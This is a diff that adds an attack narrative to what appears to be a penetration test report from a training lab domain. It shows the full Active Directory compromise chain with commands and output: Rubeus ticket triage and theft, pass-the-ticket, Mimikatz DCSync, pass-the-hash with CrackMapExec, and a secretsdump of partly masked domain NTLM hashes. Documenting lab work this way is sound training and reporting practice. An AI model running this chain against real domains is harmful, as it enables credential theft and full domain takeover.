@@ -153,4 +153,197 @@ SMB         192.168.195.220 445    SQL01            INLANEFREIGHT\srvadmin:<REDA
 
 SMB         192.168.195.220 445    SQL01            [+] Dumped 10 LSA secrets to /home/mrb3n/.cme/logs/SQL01_192.168.195.220_2022-05-14_081528.secrets and /home/mrb3n/.cme/logs/SQL01_192.168.195.220_2022-05-14_081528.cached
 
+Using these credentials, the tester logged into the MS01 host via Remote Desktop (RDP) and noted that another user, pramirez, was also currently logged in.
+
+Logged in Users: 
+
+C:\htb> query user
+
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+ pramirez              rdp-tcp#1           2  Active          3  5/14/2022 8:21 AM
+>srvadmin              rdp-tcp#2           3  Active          .  5/14/2022 8:24 AM
+
+The tester checked the BloodHound tool and noticed that this user could perform the DCSync attack, a technique for stealing the Active Directory password database by leveraging a protocol used by domain controllers to replicate domain data. This attack can be used to retrieve NTLM password hashes for any user in the domain.
+
+After connecting, the tester used the Rubeus tool to view all Kerberos tickets currently available on the system and noticed that tickets for the pramirez user were present.
+
+Rubeus: 
+PS C:\htb> .\Rubeus.exe triage
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+
+Action: Triage Kerberos Tickets (All Users)
+
+[*] Current LUID    : 0x256aef
+
+ ------------------------------------------------------------------------------------------------------------------------
+ | LUID     | UserName                       | Service                                           | EndTime              |
+ ------------------------------------------------------------------------------------------------------------------------
+ | 0x256aef | srvadmin @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 5/14/2022 6:24:19 PM |
+ | 0x256aef | srvadmin @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:24:19 PM |
+ | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 5/14/2022 6:21:35 PM |
+ | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | ProtectedStorage/DC01.INLANEFREIGHT.LOCAL         | 5/14/2022 6:21:35 PM |
+ | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | cifs/DC01.INLANEFREIGHT.LOCAL                     | 5/14/2022 6:21:35 PM |
+ | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | cifs/DC01                                         | 5/14/2022 6:21:35 PM |
+ | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM |
+ | 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 5/14/2022 6:21:35 PM |
+ | 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM 
+
+The tester then used this tool to retrieve the Kerberos TGT ticket for this user, which can then be used to perform a "pass-the-ticket" attack and use the stolen TGT ticket to access resources in the domain.
+
+Rubeus pt 2: 
+PS C:\htb> .\Rubeus.exe dump /luid:0x1a8b19 /service:krbtgt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+
+Action: Dump Kerberos Ticket Data (All Users)
+
+[*] Target service  : krbtgt
+[*] Target LUID     : 0x1a8b19
+[*] Current LUID    : 0x256aef
+
+  UserName                 : pramirez
+  Domain                   : INLANEFREIGHT
+  LogonId                  : 0x1a8b19
+  UserSID                  : S-1-5-21-1666128402-2659679066-1433032234-1108
+  AuthenticationPackage    : Negotiate
+  LogonType                : RemoteInteractive
+  LogonTime                : 5/14/2022 8:21:35 AM
+  LogonServer              : DC01
+  LogonServerDNSDomain     : INLANEFREIGHT.LOCAL
+  UserPrincipalName        : pramirez@INLANEFREIGHT.LOCAL
+
+
+    ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
+    ServiceRealm             :  INLANEFREIGHT.LOCAL
+    UserName                 :  pramirez
+    UserRealm                :  INLANEFREIGHT.LOCAL
+    StartTime                :  5/15/2022 3:51:35 AM
+    EndTime                  :  5/15/2022 1:51:35 PM
+    RenewTill                :  5/21/2022 8:21:35 AM
+    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+    KeyType                  :  aes256_cts_hmac_sha1
+    Base64(key)              :  3g/++VoJZ4ipbExARBCKK960cN+3juTKNHiQ8XpHL/k=
+    Base64EncodedTicket   :
+
+      doIFZDCCBWCgAwIBBaEDAgEWooIEVDCCBFBhgg<SNIP>
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+
+The user performed the pass-the-ticket attack and successfully authenticated as the pramirez user.
+
+PTT: 
+PS C:\htb> .\Rubeus.exe ptt /ticket:doIFZDCCBWCgAwIBBaEDAgEWo<SNIP>
+
+This was confirmed using the klist command to view cached Kerberos tickets in the current session.
+
+Confirmed Cached Kerberos Ticket 
+PS C:\htb> klist
+
+Current LogonId is 0:0x256d1d
+
+Cached Tickets: (1)
+
+#0>     Client: pramirez @ INLANEFREIGHT.LOCAL
+        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 5/15/2022 3:51:35 (local)
+        End Time:   5/15/2022 13:51:35 (local)
+        Renew Time: 5/21/2022 8:21:35 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+
+
+The tester then utilized this access to perform a DCSync attack and retrieve the NTLM password hash for the built-in Administrator account, which led to Enterprise Admin level access over the domain.
+
+Mimikatz: 
+PS C:\htb> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator
+[DC] 'INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'INLANEFREIGHT\administrator' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+[DC] ms-DS-ReplicationEpoch is: 1
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 2/12/2022 9:32:55 PM
+Object Security ID   : S-1-5-21-1666128402-2659679066-1433032234-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: e4axxxxxxxxxxxxxxxx1c88c2e94cba2
+
+Tester confirmed access by authenticating to DC on inlanefreight.local
+
+CrackMapExec 
+MJBUCKNER@htb[/htb]$ sudo crackmapexec smb 192.168.195.204 -u administrator -H e4axxxxxxxxxxxxxxxx1c88c2e94cba2
+
+SMB         192.168.195.204 445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         192.168.195.204 445    DC01             [+] INLANEFREIGHT.LOCAL\administrator e4axxxxxxxxxxxxxxxx1c88c2e94cba2 
+
+With this access, it was possible to retrieve the NTLM password hashes for all users in the domain. The tester then performed offline cracking of these hashes using the Hashcat tool. A domain password analysis showing several metrics can be found in the appendices of this report.
+
+Dumping NTDS / SecretsDump: 
+
+MJBUCKNER@htb[/htb]$ secretsdump.py inlanefreight/administrator@192.168.195.204 -hashes ad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2 -just-dc-ntlm
+
+Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cxxxxxxxxxx7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4180f1f4xxxxxxxxxx0e8523771a8c:::
+mssqlsvc:1106:aad3b435b51404eeaad3b435b51404ee:55a6c7xxxxxxxxxxxx2b07e1:::
+srvadmin:1107:aad3b435b51404eeaad3b435b51404ee:9f9154fxxxxxxxxxxxxx0930c0:::
+pramirez:1108:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9xxxxxxxxxxxxxed5c58:::
+
+<SNIP>
+
 
